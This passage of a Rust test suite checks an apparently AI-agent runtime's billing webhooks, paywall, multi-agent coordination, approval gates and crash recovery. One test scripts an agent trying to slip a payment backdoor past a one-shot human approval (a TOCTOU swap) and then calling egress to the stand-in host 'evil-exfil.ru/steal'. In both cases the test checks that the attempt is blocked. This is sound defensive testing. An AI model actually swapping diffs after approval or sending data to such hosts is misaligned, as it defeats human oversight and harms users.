                    "org_id": "polar-org",
                    "plan_tier": "team",
                    "claim_id": claim_id
                }
            }
        });
        let (forged_head, _) = http_req_with_headers(
            addr,
            "POST",
            "/v1/billing/webhook",
            &[
                ("X-Polar-Signature", "sha256=deadbeef0000"),
            ],
            Some(polar_activate.clone()),
        )
        .await;
        assert!(forged_head.contains("401 Unauthorized"));

        // 3. Send valid HMAC-SHA256 signed Polar.sh `subscription.created` webhook -> auto-upgrades tenant & mints `ak_live_*` key
        let body_str = polar_activate.to_string();
        let valid_sig = paas::PaasControlPlane::hmac_sha256_hex(
            webhook_secret.as_bytes(),
            body_str.as_bytes(),
        );
        let (wh_head, wh_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/billing/webhook",
            &[
                ("X-Polar-Signature", &format!("sha256={}", valid_sig)),
            ],
            Some(polar_activate),
        )
        .await;
        assert!(wh_head.contains("200 OK"));
        assert_eq!(wh_resp["status"], "subscription_activated");
        assert_eq!(wh_resp["provider"], "polar");
        assert_eq!(wh_resp["plan_tier"], "team");
        assert_eq!(wh_resp["max_concurrent_agents"], 32);
        assert!(wh_resp.get("api_key").is_none(), "raw key must not be echoed to the provider");

        // 4. An email or org id alone, or another checkout's token, can't collect the key.
        for body in [
            json!({ "email": "founder@polar-org.dev" }),
            json!({ "org_id": "polar-org" }),
            json!({ "claim_token": other_token }),
        ] {
            let (head, _) =
                http_req_with_headers(addr, "POST", "/v1/billing/claim", &[], Some(body)).await;
            assert!(head.contains("404 Not Found"), "{head}");
        }

        // The buyer claims their newly minted `ak_live_*` key with the checkout's claim token.
        let (claim_head, claim_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/billing/claim",
            &[],
            Some(json!({ "claim_token": claim_token })),
        )
        .await;
        assert!(claim_head.contains("200 OK"));
        assert_eq!(claim_resp["status"], "subscription_claimed");
        let claimed_key = claim_resp["api_key"].as_str().unwrap().to_string();
        assert!(claimed_key.starts_with("ak_live_"));
        // The claim never carries the approver secret (the claim token may sit on disk where an
        // agent can read it); it mails an enrollment link to the billing address instead.
        assert!(claim_resp.get("approver").is_none());
        assert!(!claim_resp.to_string().contains("otpauth"));
        assert_eq!(claim_resp["approver_enrollment"]["status"], "email_sent", "{claim_resp}");
        let mail = std::fs::read_dir(&outbox).unwrap().next().unwrap().unwrap().path();
        let mail = std::fs::read_to_string(mail).unwrap();
        assert!(mail.starts_with(&format!("To: {}", claim_resp["customer_email"].as_str().unwrap().to_lowercase())), "{mail}");
        assert_eq!(kernel.paas.approver_status("polar-org").await["enrolled"], false);

        // Second claim attempt for the same key is rejected (one-time claim security)
        let (reclaim_head, _) = http_req_with_headers(
            addr,
            "POST",
            "/v1/billing/claim",
            &[],
            Some(json!({ "claim_token": claim_token })),
        )
        .await;
        assert!(reclaim_head.contains("404 Not Found"));

        // 5. Provision an active Cloud Workspace for `polar-org` using the claimed key
        let (ws_head, ws_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/workspaces",
            &[("Authorization", &format!("Bearer {}", claimed_key))],
            Some(json!({
                "org_id": "polar-org",
                "workspace_id": "ws-polar-1",
                "source_url": source_repo.to_string_lossy(),
                "agents": ["agy-agent", "claude-code", "codex-cli"]
            })),
        )
        .await;
        assert!(
            ws_head.contains("200 OK"),
            "ws_head={}, ws_resp={}",
            ws_head,
            ws_resp
        );

        // 6. Send Lemon Squeezy `subscription_cancelled` webhook -> revokes subscription key, downgrades to Community, and hibernates workspace!
        let ls_cancel = json!({
            "meta": {
                "event_name": "subscription_cancelled",
                "custom_data": {
                    "org_id": "polar-org"
                }
            },
            "data": {
                "id": "sub_polar_99"
            }
        });
        let cancel_sig = paas::PaasControlPlane::hmac_sha256_hex(
            webhook_secret.as_bytes(),
            ls_cancel.to_string().as_bytes(),
        );
        let (can_head, can_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/billing/webhook",
            &[
                ("X-Signature", &cancel_sig),
            ],
            Some(ls_cancel),
        )
        .await;
        assert!(can_head.contains("200 OK"));
        assert_eq!(can_resp["status"], "subscription_canceled");
        assert_eq!(can_resp["downgraded_plan"], "community");
        assert_eq!(can_resp["hibernated_workspaces"], json!(["ws-polar-1"]));

        // Revoked subscription key is now rejected with `401 Unauthorized`
        let (revoked_head, _) = http_req_with_headers(
            addr,
            "POST",
            "/v1/mcp",
            &[("Authorization", &format!("Bearer {}", claimed_key))],
            Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "initialize" })),
        )
        .await;
        assert!(revoked_head.contains("401 Unauthorized"));

        // 7. Verify Admin Secret Guard on `POST /v1/tenants/plan` blocks unauthorized self-upgrades
        let (unauth_plan_head, unauth_plan_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/tenants/plan",
            // A client-chosen "override" must not let it pick the secret it then presents.
            &[
                ("X-Aegis-Admin-Secret-Override", "attacker"),
                ("X-Aegis-Admin-Secret", "attacker"),
            ],
            Some(json!({ "org_id": "free-org", "plan_tier": "pro" })),
        )
        .await;
        assert!(unauth_plan_head.contains("401 Unauthorized"), "{unauth_plan_head}");
        assert!(unauth_plan_resp["error"].is_string());
        let op_bearer = format!("Bearer {}", kernel.operator_token());

        // 8. Verify `/v1/mcp` Dynamic Concurrent Agent Paywall on Free (`community`) plan (max 1 active Agent)
        let (agent1_head, agent1_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/mcp",
            &[
                ("Authorization", op_bearer.as_str()),
                ("X-Aegis-Org", "free-org"),
                ("X-Aegis-Agent", "claude-agent-1"),
            ],
            Some(json!({
                "jsonrpc": "2.0",
                "id": 10,
                "method": "tools/call",
                "params": {
                    "name": "workspace_status",
                    "arguments": {}
                }
            })),
        )
        .await;
        assert!(agent1_head.contains("200 OK"));
        assert!(agent1_resp["result"]["isError"].is_null());

        // Second concurrent Agent (`cursor-agent-2`) on Free (`community`) plan is blocked by the Paywall!
        let (agent2_head, agent2_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/mcp",
            &[
                ("Authorization", op_bearer.as_str()),
                ("X-Aegis-Org", "free-org"),
                ("X-Aegis-Agent", "cursor-agent-2"),
            ],
            Some(json!({
                "jsonrpc": "2.0",
                "id": 11,
                "method": "tools/call",
                "params": {
                    "name": "workspace_status",
                    "arguments": {}
                }
            })),
        )
        .await;
        assert!(agent2_head.contains("200 OK"));
        assert_eq!(agent2_resp["result"]["isError"], true);
        assert_eq!(
            agent2_resp["result"]["paywall"]["code"],
            "PAYWALL_CONCURRENT_AGENTS_LIMIT"
        );
        assert!(agent2_resp["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("[AEGIS CLOUD PAYWALL"));

        // 9. Verify `X-Aegis-Paywall-Mode: http-402` returns HTTP 402 Payment Required
        let (p402_head, p402_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/mcp",
            &[
                ("Authorization", op_bearer.as_str()),
                ("X-Aegis-Org", "free-org"),
                ("X-Aegis-Agent", "cursor-agent-2"),
                ("X-Aegis-Paywall-Mode", "http-402"),
            ],
            Some(json!({
                "jsonrpc": "2.0",
                "id": 12,
                "method": "tools/call",
                "params": {
                    "name": "workspace_status",
                    "arguments": {}
                }
            })),
        )
        .await;
        assert!(p402_head.contains("402 Payment Required"));
        assert_eq!(p402_resp["code"], "PAYWALL_CONCURRENT_AGENTS_LIMIT");

        // 10. Verify `/v1/billing/status` returns live quota & subscription status without leaking `ak_live_*`
        let (stat_head, stat_resp) = http_req_with_headers(
            addr,
            "GET",
            "/v1/billing/status?org_id=free-org",
            &[],
            None,
        )
        .await;
        assert!(stat_head.contains("200 OK"));
        assert_eq!(stat_resp["plan_tier"], "community");
        assert_eq!(stat_resp["quotas"]["daily_syscalls_used"], 1);
        assert_eq!(stat_resp["quotas"]["daily_syscalls_limit"], 200);
        assert_eq!(stat_resp["quotas"]["active_agents_count"], 1);
    }

    #[tokio::test]
    async fn test_proc_exec_background_job_and_poll_pid() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_dir = temp.path().join("runtime");
        let host_project = temp.path().join("host_project");
        tokio::fs::create_dir_all(&host_project).await.unwrap();
        tokio::fs::write(host_project.join("README.md"), "# Test\n")
            .await
            .unwrap();

        let kernel = AegisRuntimeKernel::new(&runtime_dir).await.unwrap();
        let agent = AgentIdentity::new("org-bg", "agent-bg", "Benchmark Runner");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_project,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        let start_out = kernel
            .call_tool(
                &agent,
                "proc_exec",
                json!({
                    "command": "sh",
                    "args": ["-c", "echo 'benchmark_done_123'"],
                    "background": true
                }),
            )
            .await
            .unwrap();
        let pid = start_out["pid"].as_u64().expect("Expected background pid");
        assert!(pid > 0);
        assert!(start_out["exit_code"].is_null());

        for _ in 0..20 {
            let poll = kernel
                .call_tool(&agent, "proc_exec", json!({ "poll_pid": pid }))
                .await
                .unwrap();
            if poll["exit_status"] == "exited"
                && poll["stdout"]
                    .as_str()
                    .unwrap_or("")
                    .contains("benchmark_done_123")
            {
                assert_eq!(poll["exit_code"], json!(0));
                return;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        panic!("Background job did not complete within expected window");
    }

    #[tokio::test]
    async fn test_multi_agent_collaboration_task_tree_claims_ipc_wait_and_hash_chain() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_dir = temp.path().join("runtime");
        let host_project = temp.path().join("host_project");
        tokio::fs::create_dir_all(host_project.join("crates/aos-vfs/src"))
            .await
            .unwrap();
        tokio::fs::write(
            host_project.join("crates/aos-vfs/src/lib.rs"),
            "pub fn v1() -> u32 { 1 }\n",
        )
        .await
        .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_dir).await.unwrap());
        let user_client = AgentIdentity::new("acme", "user-lead", "Requester");
        let lead_agent = AgentIdentity::new("acme", "agy-lead", "Lead Architect");
        let worker_agent = AgentIdentity::new("acme", "claude-worker", "Worker");

        for id in [&user_client, &lead_agent, &worker_agent] {
            kernel
                .ensure_agent_environment(
                    id.clone(),
                    &host_project,
                    IsolationTier::NativeOsSandbox,
                    vec!["*".to_string()],
                )
                .await
                .unwrap();
        }

        // 1. User assigns parent task T1 to Lead Agent (`agy-lead`)
        let t1_sent = kernel
            .call_tool(
                &user_client,
                "ipc_request",
                json!({
                    "to_agent": "agy-lead",
                    "subject": "Upgrade VFS collaboration engine",
                    "payload": { "goal": "phase-abc" }
                }),
            )
            .await
            .unwrap();
        let t1_id = t1_sent["msg_id"].as_str().unwrap().to_string();

        // Grant a TaskScoped workspace_commit lease bound to T1 for Lead Agent
        let lease_res = kernel
            .call_tool(
                &lead_agent,
                "policy_grant_lease",
                json!({
                    "action_pattern": "workspace_commit",
                    "resource_pattern": "*",
                    "ttl_secs": 600,
                    "task_id": t1_id
                }),
            )
            .await
            .unwrap();
        let t1_lease_id = lease_res["lease_id"].as_str().unwrap().to_string();

        // 2. While working on T1, Lead Agent delegates subtask T2 to Worker Agent (`claude-worker`).
        //    Verify T2 automatically inherits `parent_task_id = T1`, and Lead Agent's `active_task_id`
        //    remains T1 (no silent downgrade of TaskScoped lease!).
        let t2_sent = kernel
            .call_tool(
                &lead_agent,
                "ipc_request",
                json!({
                    "to_agent": "claude-worker",
                    "subject": "Implement VFS helper",
                    "payload": { "module": "vfs" }
                }),
            )
            .await
            .unwrap();
        let t2_id = t2_sent["msg_id"].as_str().unwrap().to_string();
        assert_eq!(
            kernel.active_task_id(&lead_agent).await.as_deref(),
            Some(t1_id.as_str()),
            "Delegating subtask T2 must not clobber Lead Agent's active_task_id T1"
        );

        let t2_info = kernel
            .call_tool(&lead_agent, "ipc_task_get", json!({ "task_id": t2_id }))
            .await
            .unwrap();
        assert_eq!(t2_info["parent_task_id"], json!(t1_id));

        // 3. Lead Agent claims `crates/aos-vfs/**` (auto-bound to T1).
        //    Worker Agent attempts overlapping glob `crates/*/src/lib.rs` -> rejected by 2D NFA glob check!
        let claim_lead = kernel
            .call_tool(
                &lead_agent,
                "coord_claim",
                json!({ "paths": ["crates/aos-vfs/**"], "note": "Lead editing VFS" }),
            )
            .await
            .unwrap();
        assert_eq!(claim_lead["status"], "ok");

        let claim_worker_clash = kernel
            .call_tool(
                &worker_agent,
                "coord_claim",
                json!({ "paths": ["crates/*/src/lib.rs"] }),
            )
            .await
            .unwrap();
        assert_eq!(claim_worker_clash["status"], "partial");
        assert_eq!(claim_worker_clash["rejected"].as_array().unwrap().len(), 1);

        // 4. Worker Agent modifies `crates/aos-vfs/src/lib.rs` via `proc_exec` inside its shadow
        //    -> `proc_exec` returns `coordination_warning` alerting that `agy-lead` holds the claim!
        let exec_warn = kernel
            .call_tool(
                &worker_agent,
                "proc_exec",
                json!({
                    "command": "sh",
                    "args": ["-c", "echo '// worker edit' >> crates/aos-vfs/src/lib.rs"]
                }),
            )
            .await
            .unwrap();
        assert!(
            exec_warn["coordination_warning"]
                .as_str()
                .unwrap_or("")
                .contains("agy-lead"),
            "Expected coordination_warning on proc_exec touching peer-claimed path, got: {exec_warn}"
        );
        // Rollback worker's uncoordinated edit before waiting properly via `ipc_wait`
        let snaps = kernel
            .call_tool(&worker_agent, "workspace_status", json!({}))
            .await
            .unwrap();
        let base_snap = snaps["snapshots"][0]["snapshot_id"].as_str().unwrap();
        kernel
            .call_tool(
                &worker_agent,
                "workspace_rollback",
                json!({ "snapshot_id": base_snap }),
            )
            .await
            .unwrap();

        // 5. Worker Agent calls `ipc_wait(claim_paths=["crates/aos-vfs/src/lib.rs"], auto_claim=true)`
        //    concurrently while Lead Agent edits and runs `workspace_commit` (which auto-releases its claim!).
        let k_wait = kernel.clone();
        let worker_clone = worker_agent.clone();
        let wait_handle = tokio::spawn(async move {
            k_wait
                .call_tool(
                    &worker_clone,
                    "ipc_wait",
                    json!({
                        "claim_paths": ["crates/aos-vfs/src/lib.rs"],
                        "auto_claim": true,
                        "timeout_ms": 5000
                    }),
                )
                .await
                .unwrap()
        });

        tokio::time::sleep(std::time::Duration::from_millis(120)).await;
        kernel
            .call_tool(
                &lead_agent,
                "fs_write",
                json!({
                    "path": "crates/aos-vfs/src/lib.rs",
                    "content": "pub fn v1() -> u32 { 1 }\npub fn v2_from_lead() -> u32 { 2 }\n"
                }),
            )
            .await
            .unwrap();
        let commit_out = kernel
            .call_tool(&lead_agent, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(commit_out["status"], "committed_to_host");
        assert_eq!(
            commit_out["released_claims"],
            json!(["crates/aos-vfs/**"]),
            "workspace_commit should auto-release matching claims by default"
        );

        let wait_res = wait_handle.await.unwrap();
        assert_eq!(wait_res["status"], "ready");
        assert_eq!(wait_res["reason"], "claims_available");
        assert_eq!(
            wait_res["claimed"]["changed"],
            json!(["crates/aos-vfs/src/lib.rs"])
        );
        // Verify Worker Agent's shadow workspace was automatically rebased onto Lead Agent's commit!
        let worker_read = kernel
            .call_tool(
                &worker_agent,
                "fs_read",
                json!({ "path": "crates/aos-vfs/src/lib.rs" }),
            )
            .await
            .unwrap();
        assert!(
            worker_read["content"]
                .as_str()
                .unwrap()
                .contains("v2_from_lead"),
            "ipc_wait should auto-rebase worker shadow workspace onto peer commit"
        );

        // 6. Verify Cascade Cancel on parent task T1 cancels child task T2, revokes T1's TaskScoped
        //    lease, and auto-releases T2's bound file claim (`crates/aos-vfs/src/lib.rs`)!
        kernel
            .call_tool(
                &user_client,
                "ipc_task_update",
                json!({
                    "task_id": t1_id,
                    "state": "canceled",
                    "message": "Cancel parent epic"
                }),
            )
            .await
            .unwrap();

        let t1_final = kernel
            .call_tool(
                &user_client,
                "ipc_task_get",
                json!({ "task_id": t1_id, "include_audit_trace": true }),
            )
            .await
            .unwrap();
        assert_eq!(t1_final["state"], "canceled");
        assert_eq!(t1_final["subtasks_count"], 1);
        assert_eq!(t1_final["subtasks"][0]["id"], t2_id);
        assert_eq!(t1_final["subtasks"][0]["state"], "canceled");
        assert_eq!(t1_final["hash_chain_verified"], true);
        assert!(
            !t1_final["audit_trace"].as_array().unwrap().is_empty(),
            "ipc_task_get should return the task's Flight Recorder audit trace"
        );
        assert_eq!(t1_final["lease_ids"], json!([t1_lease_id]));

        // Both T1's TaskScoped lease and T2's file claim must have been cleaned up automatically!
        let (remaining_claims, _) = kernel.load_claims("acme").await.unwrap();
        assert!(
            remaining_claims.is_empty(),
            "Cascade cancel must release child task T2's bound claims, found: {remaining_claims:?}"
        );
        let remaining_leases = kernel.policy.list_leases("acme", None).await.unwrap();
        assert!(
            remaining_leases.is_empty(),
            "Terminal task cleanup must revoke TaskScoped leases"
        );
    }

    #[tokio::test]
    async fn test_toctou_diff_swap_egress_escalation_and_hash_chain_audit() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_dir = temp.path().join("runtime");
        let host_project = temp.path().join("host_project");
        tokio::fs::create_dir_all(host_project.join("src"))
            .await
            .unwrap();
        tokio::fs::write(host_project.join("README.md"), "# Benign Doc\n")
            .await
            .unwrap();
        tokio::fs::write(
            host_project.join("src/payment_engine.rs"),
            "pub fn charge(cents: u64) -> u64 { cents }\n",
        )
        .await
        .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_dir).await.unwrap());
        let agent = AgentIdentity::new("acme", "coder-alpha", "Engineer");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_project,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // 1. Agent edits benign README.md and requests `workspace_commit` -> mints `esc-*` with `evidence_hash`
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "README.md",
                    "content": "# Benign Doc (fixed typo)\n"
                }),
            )
            .await
            .unwrap();
        let ask_1 = kernel
            .call_tool(
                &agent,
                "workspace_commit",
                json!({ "rationale": "Fix typo in README" }),
            )
            .await
            .unwrap();
        assert_eq!(ask_1["status"], "approval_required");
        let esc_1 = ask_1["escalation_id"].as_str().unwrap().to_string();
        let hash_1 = ask_1["evidence_hash"].as_str().unwrap().to_string();
        assert_eq!(hash_1.len(), 64);

        // Human approves `esc_1` as a One-Shot (`ttl_secs = 0`) lease
        let lease_1 = kernel
            .policy
            .approve_escalation(&esc_1, 0, "human-lead")
            .await
            .unwrap();
        assert_eq!(lease_1.resource_pattern, format!("sha256:{}", hash_1));

        // 2. TOCTOU Bait-and-Switch attack: Agent sneaks a malicious change into `src/payment_engine.rs`
        //    BEFORE calling `workspace_commit` again, hoping to use the One-Shot lease!
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "src/payment_engine.rs",
                    "content": "pub fn charge(_cents: u64) -> u64 { 0 /* backdoor */ }\n"
                }),
            )
            .await
            .unwrap();
        let swapped_attempt = kernel
            .call_tool(&agent, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(
            swapped_attempt["status"], "approval_required",
            "Mutated shadow diff must NOT bypass approval via the One-Shot lease pinned to hash_1"
        );
        let host_payment = tokio::fs::read_to_string(host_project.join("src/payment_engine.rs"))
            .await
            .unwrap();
        assert!(
            !host_payment.contains("backdoor"),
            "Host repository must remain untouched after blocked TOCTOU diff swap"
        );

        // Restore `src/payment_engine.rs` to baseline -> original diff matches `hash_1` and commits!
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "src/payment_engine.rs",
                    "content": "pub fn charge(cents: u64) -> u64 { cents }\n"
                }),
            )
            .await
            .unwrap();
        let clean_commit = kernel
            .call_tool(&agent, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(clean_commit["status"], "committed_to_host");

        // 3. Egress unlisted domain escalation: calling `egress_http_request` on `api.stripe.com`
        //    mints an `egress_unlisted_domain` escalation ticket scoped to `api.stripe.com`.
        let egress_ask = kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "target_domain": "api.stripe.com",
                    "method": "POST",
                    "path": "/v1/charges"
                }),
            )
            .await
            .unwrap();
        assert_eq!(egress_ask["status"], "approval_required");
        let egress_esc_id = egress_ask["escalation_id"].as_str().unwrap();
        kernel
            .call_tool(
                &agent,
                "policy_approve_escalation",
                json!({ "escalation_id": egress_esc_id, "ttl_secs": 300 }),
            )
            .await
            .unwrap();

        let egress_ok = kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "target_domain": "api.stripe.com",
                    "method": "POST",
                    "path": "/v1/charges"
                }),
            )
            .await
            .unwrap();
        assert!(egress_ok.get("AllowedAndSanitized").is_some(), "{egress_ok}");

        // Unapproved domain `evil-exfil.ru` still escalates!
        let evil_ask = kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "target_domain": "evil-exfil.ru",
                    "method": "POST",
                    "path": "/steal"
                }),
            )
            .await
            .unwrap();
        assert_eq!(evil_ask["status"], "approval_required");

        // 4. Verify SHA-256 hash-chained audit ledger (`FlightRecorder`) recorded both `ask:` and `approved:` events
        let chain = kernel.recorder.verify_chain(Some("acme")).await.unwrap();
        assert_eq!(chain["verified"], true);
        let events = kernel
            .recorder
            .query_events("acme", Some("coder-alpha"), 100)
            .await
            .unwrap();
        assert!(events
            .iter()
            .any(|e| e.policy_decision.starts_with("approved:")));
    }

    #[tokio::test]
    async fn test_web_approval_diff_preview_batched_sensitive_commit_and_lease_revocation() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_dir = temp.path().join("runtime");
        let host_project = temp.path().join("host_project");
        tokio::fs::create_dir_all(&host_project).await.unwrap();
        tokio::fs::write(host_project.join("Cargo.toml"), "[package]\nname = \"demo\"\n")
            .await
            .unwrap();
        tokio::fs::write(host_project.join("package.json"), "{\"name\":\"demo\"}\n")
            .await
            .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_dir).await.unwrap());
        let addr = kernel
            .clone()
            .start_http_daemon("127.0.0.1:0", host_project.clone())
            .await
            .unwrap();
        let op = kernel.operator_token();

        let agent = AgentIdentity::new("acme", "coder-beta", "Engineer");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_project,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // 1. Agent modifies BOTH sensitive files (`Cargo.toml` and `package.json`) in a single commit
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "Cargo.toml",
                    "content": "[package]\nname = \"demo\"\nversion = \"0.2.0\"\n"
                }),
            )
            .await
            .unwrap();
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "package.json",
                    "content": "{\"name\":\"demo\",\"version\":\"0.2.0\"}\n"
                }),
            )
            .await
            .unwrap();

        let ask = kernel
            .call_tool(
                &agent,
                "workspace_commit",
                json!({ "rationale": "Bump version across Rust and Node manifests" }),
            )
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required");
        let esc_id = ask["escalation_id"].as_str().unwrap().to_string();

        // 2. Web console fetches `GET /v1/approvals/diff?escalation_id=...` -> returns unified diff & rationale
        let (head, diff_resp) = raw_http(
            addr,
            "GET",
            &format!("/v1/approvals/diff?escalation_id={esc_id}"),
            Some(&op),
            None,
        )
        .await;
        assert!(head.contains("200 OK"), "{head} {diff_resp}");
        assert_eq!(
            diff_resp["rationale"],
            "Bump version across Rust and Node manifests"
        );
        let udiff = diff_resp["diff"]["unified_diff"].as_str().unwrap_or("");
        assert!(udiff.contains("Cargo.toml") && udiff.contains("package.json"), "{diff_resp}");

        // 3. Approving the single batched escalation once (`ttl_secs = 0`) authorizes BOTH sensitive files in 1 click!
        let (head, dec_resp) = raw_http(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&op),
            Some(json!({ "escalation_id": esc_id, "decision": "approve", "ttl_secs": 0 })),
        )
        .await;
        assert!(head.contains("200 OK"), "{head} {dec_resp}");

        let commit_ok = kernel
            .call_tool(&agent, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(
            commit_ok["status"], "committed_to_host",
            "Single approval of batched sensitive commit must land all sensitive files without whack-a-mole"
        );

        // 4. Grant a 1-hour session lease and revoke it via `POST /v1/leases/revoke`
        let granted = kernel
            .call_tool(
                &agent,
                "policy_grant_lease",
                json!({
                    "action_pattern": "workspace_commit",
                    "resource_pattern": "*",
                    "ttl_secs": 3600
                }),
            )
            .await
            .unwrap();
        let lease_id = granted["lease_id"].as_str().unwrap().to_string();
        assert!(!kernel.policy.list_leases("acme", None).await.unwrap().is_empty());

        let (head, rev_resp) = raw_http(
            addr,
            "POST",
            "/v1/leases/revoke",
            Some(&op),
            Some(json!({ "lease_id": lease_id })),
        )
        .await;
        assert!(head.contains("200 OK"), "{head} {rev_resp}");
        assert_eq!(rev_resp["status"], "revoked");
        assert!(
            kernel
                .policy
                .list_leases("acme", None)
                .await
                .unwrap()
                .iter()
                .all(|l| l.lease_id != lease_id),
            "Revoked lease must be removed from active leases"
        );
    }

    #[tokio::test]
    async fn test_orphaned_shadow_detection_and_recovery_after_crash() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_root = temp.path().join("runtime");
        let host_repo = temp.path().join("host_repo");
        tokio::fs::create_dir_all(&host_repo).await.unwrap();
        tokio::fs::write(host_repo.join("main.rs"), "fn main() {}\n")
            .await
            .unwrap();

        {
            let kernel1 = AegisRuntimeKernel::new(&runtime_root).await.unwrap();
            let crashed = AgentIdentity::new("org-recover", "agy-dead", "Worker");
            kernel1
                .ensure_agent_environment(
                    crashed.clone(),
                    &host_repo,
                    IsolationTier::NativeOsSandbox,
                    vec!["*".to_string()],
                )
                .await
                .unwrap();
            kernel1
                .ipc
                .update_peer_metadata(
                    &crashed,
                    Some("agy".to_string()),
                    Some(999_999_999),
                    Some(1),
                    Some(host_repo.display().to_string()),
                )
                .await
                .unwrap();
            kernel1
                .call_tool(
                    &crashed,
                    "fs_write",
                    json!({ "path": "recovered_exp.rs", "content": "pub fn exp() -> u32 { 42 }\n" }),
                )
                .await
                .unwrap();
            kernel1
                .call_tool(
                    &crashed,
                    "fs_write",
                    json!({ "path": "main.rs", "content": "fn main() { println!(\"recovered\"); }\n" }),
                )
                .await
                .unwrap();
            kernel1
                .call_tool(
                    &crashed,
                    "workspace_snapshot",
                    json!({ "label": "before-crash" }),
                )
                .await
                .unwrap();
        }

        // Simulate post-reboot fresh runtime kernel and new agent session.
        let kernel2 = AegisRuntimeKernel::new(&runtime_root).await.unwrap();
        let new_agent = AgentIdentity::new("org-recover", "agy-live", "Lead");
        kernel2
            .ensure_agent_environment(
                new_agent.clone(),
                &host_repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        let status = kernel2
            .call_tool(&new_agent, "workspace_status", json!({}))
            .await
            .unwrap();
        let orphaned = status["recoverable_orphaned_shadows"].as_array().unwrap();
        assert_eq!(orphaned.len(), 1, "expected 1 orphaned shadow: {status}");
        assert_eq!(orphaned[0]["agent_id"], "agy-dead");
        assert_eq!(orphaned[0]["uncommitted_changes_count"], 2);

        let sync_res = kernel2
            .call_tool(
                &new_agent,
                "workspace_sync",
                json!({ "adopt_orphaned_agent": "agy-dead" }),
            )
            .await
            .unwrap();
        assert_eq!(
            sync_res["orphan_recovery"]["status"],
            "recovered_orphaned_shadow"
        );
        assert_eq!(sync_res["orphan_recovery"]["recovered_paths_count"], 2);

        let read_new = kernel2
            .call_tool(&new_agent, "fs_read", json!({ "path": "recovered_exp.rs" }))
            .await
            .unwrap();
        assert_eq!(read_new["content"], "pub fn exp() -> u32 { 42 }\n");
        let read_main = kernel2
            .call_tool(&new_agent, "fs_read", json!({ "path": "main.rs" }))
            .await
            .unwrap();
        assert_eq!(
            read_main["content"],
            "fn main() { println!(\"recovered\"); }\n"
        );

        // Host repo must remain untouched until explicit workspace_commit.
        assert!(!host_repo.join("recovered_exp.rs").exists());
        assert_eq!(
            std::fs::read_to_string(host_repo.join("main.rs")).unwrap(),
            "fn main() {}\n"
        );
    }

    struct TestPaasVaultMounter {
        store: PathBuf,
        mounted: std::sync::Mutex<std::collections::HashSet<PathBuf>>,
    }

    impl TestPaasVaultMounter {
        fn copy_dir(src: &Path, dst: &Path) -> std::io::Result<()> {
            std::fs::create_dir_all(dst)?;
            for entry in std::fs::read_dir(src)? {
                let entry = entry?;
                let sp = entry.path();
                let dp = dst.join(entry.file_name());
                let meta = std::fs::symlink_metadata(&sp)?;
                if meta.file_type().is_symlink() {
                    #[cfg(unix)]
                    {
                        let t = std::fs::read_link(&sp)?;
                        let _ = std::fs::remove_file(&dp);
                        std::os::unix::fs::symlink(t, &dp)?;
                    }
                } else if meta.is_dir() {
                    Self::copy_dir(&sp, &dp)?;
                } else {
                    std::fs::copy(&sp, &dp)?;
                }
            }
            Ok(())
        }
    }

    impl aos_vfs::vault::VolumeMounter for TestPaasVaultMounter {
        fn detect_preferred_backend(&self) -> aos_vfs::vault::VaultBackendKind {
            aos_vfs::vault::VaultBackendKind::LuksBtrfs
        }

        fn is_mounted(&self, mount_dir: &Path) -> bool {
            self.mounted.lock().unwrap().contains(mount_dir)
        }

        fn create_and_mount(
            &self,
            _backend: aos_vfs::vault::VaultBackendKind,
            org_id: &str,
            backing_path: &Path,
            mount_dir: &Path,
            _size_gb: u64,
            _dek: &str,
        ) -> anyhow::Result<()> {
            if let Some(p) = backing_path.parent() {
                std::fs::create_dir_all(p)?;
            }
            std::fs::write(backing_path, b"LUKS2_MOCK")?;
            std::fs::create_dir_all(self.store.join(org_id))?;
            std::fs::create_dir_all(mount_dir)?;
            self.mounted.lock().unwrap().insert(mount_dir.to_path_buf());
            Ok(())
        }

        fn mount_existing(
            &self,
            _backend: aos_vfs::vault::VaultBackendKind,
            org_id: &str,
            backing_path: &Path,
            mount_dir: &Path,
            _dek: &str,
        ) -> anyhow::Result<()> {
